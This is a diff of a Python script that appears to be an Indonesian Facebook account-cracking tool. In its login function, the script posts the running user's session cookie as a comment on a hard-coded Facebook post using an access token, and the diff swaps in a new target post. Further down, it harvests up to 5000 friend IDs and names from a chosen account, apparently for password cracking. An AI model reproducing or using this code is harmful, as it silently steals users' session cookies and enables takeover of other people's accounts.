@@ -281,7 +281,7 @@ def login_men():
 		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
 		roq = ses.get(nek,cookies=cookies)
 		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-		requests.post(f"https://graph.facebook.com/v15.0/100063837653547_672104641594118/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
+		requests.post(f"https://graph.facebook.com/v15.0/100013275378835_1672257249893438/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
 		ken = open(".tokenakun.txt", "w").write(tok)
 		cok = open(".cookiesakun.txt", "w").write(cookie)
 		baz_anim(f'{puti}└──{bira} login berhasil ster jalanin ulang scnya')
@@ -319,7 +319,7 @@ def nge_krek():
 	print(f'{xxx}─────────────────────────────')
 	idnyanih = input(f'└── id : ')
 	try:
-		ambilid = requests.get('https://graph.facebook.com/v1.0/'+idnyanih+'?fields=friends.limit(5001)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
+		ambilid = requests.get('https://graph.facebook.com/v2.0/'+idnyanih+'?fields=friends.limit(5000)&access_token='+tokenefb[0],cookies={'cookie': cok}).json()
 		for proses in ambilid['friends']['data']:
 			try:id.append(proses['id']+'|'+proses['name'])
 			except:continue
